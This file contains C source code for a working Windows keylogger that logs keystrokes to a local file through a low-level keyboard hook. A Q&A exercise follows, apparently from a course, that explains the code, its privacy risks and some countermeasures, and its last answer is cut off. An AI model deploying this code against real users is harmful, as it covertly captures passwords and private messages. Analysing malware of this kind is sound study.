//Simple Keylogger Code

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

FILE *file;

void log_key(int key) {
    if (key == 1 || key == 2)
        return; // Ignore mouse clicks

    if (key == 8)
        fprintf(file, "%s", "[BACKSPACE]");
    else if (key == 13)
        fprintf(file, "%s", "[ENTER]");
    else if (key == 32)
        fprintf(file, "%s", "[SPACE]");
    else if (key >= 65 && key <= 90)
        fprintf(file, "%c", key + 32); // Convert to lowercase
    else
        fprintf(file, "%c", key);
    fflush(file);
}

LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT *)lParam;
        log_key(kb->vkCode);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookProc, NULL, 0);
    if (!hook) {
        fprintf(stderr, "Failed to install hook!\n");
        return 1;
    }

    file = fopen("keylog.txt", "a+");
    if (!file) {
        fprintf(stderr, "Failed to open file!\n");
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hook);
    fclose(file);
    return 0;
}

/*Q&A - A simple Keylogger code in C
Keyloggers aren't yet 100% mitigated as even if most AV Systems can detect it new variants keep on coming making it an ongoing threat

1 - What is the purpose of the log_key function, and how does it work?
    {
    The log key_function records the keystrokes of the user. It does take an integer key code as a parameter and writes the 
    corresponding character or key name to a file 
    The special keys like ENTER and BACKSPACE are handled by being mapped with their respective names and the alphabetic characters
    are converted to lowercase characters. 
    }


2 - Explain the role of the HookProc function in this keylogger.
    {
    SO the HookProc function in the keylogger code is mainly to process the Keyboards Events. The function is called whenever 
    a key is pressed/released and creating the log for it's keycode with the log_key function  
    }

3 - Describe how the SetWindowsHookEx function is used in the main function. What parameters are passed to it, and what do they signify?
    {
    The SetWindowsHookEx function is used in the main function to set up a a keyboard hook in this case a LL (Low Level) keyboard hook,
    which is done using WH_KEYBOARD_LL, HookProc being a pointer to the hook. 
    }

4 - Identify any potential security risks or ethical concerns associated with this keylogger.
    {
    By simply analyzing the code we can tell that it is likely to be considered a malware as it can be used with malicious intent affecting
    the privacy and security by capturing sensitive information like passwords, personal messages, browser searches and others...
    }

5 - Suggest potential mitigations or countermeasures to detect and prevent this type of malware.
    {
    Usage of AV; Regular updates; Behavioural Analysis of unauthorized keylogging; Usage of MFA for better prevention in the case
    of an undetected KeyLogging that is running as a persistent threat in the machine
    }
6 - Explain the purpose of the fopen function call in the main function. What do the parameters "a+" mean?
    {
    The fopen is part of the stanrd library of C and in the main functino it simple opens a file named keylog.txt and the parameter a+ 
    
    }
*/